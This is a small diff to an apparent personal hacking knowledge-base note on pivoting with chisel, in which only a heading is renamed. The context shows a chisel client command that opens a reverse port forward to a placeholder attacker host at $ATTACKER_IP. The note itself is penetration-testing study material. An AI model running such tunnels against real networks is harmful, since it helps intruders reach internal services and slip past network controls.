@@ -5,7 +5,7 @@ The client specifies the ports.
 ./chisel client $ATTACKER_IP:443 R:1234:127.0.0.1:1234
 ```
 
-# References
+# Related
 - [20221003150604](/zet/20221003150604/README.md) tunneling through chisel - socks
 - ~/kb/hacking/commands/pivot-tunnel-through-chisel.md
 
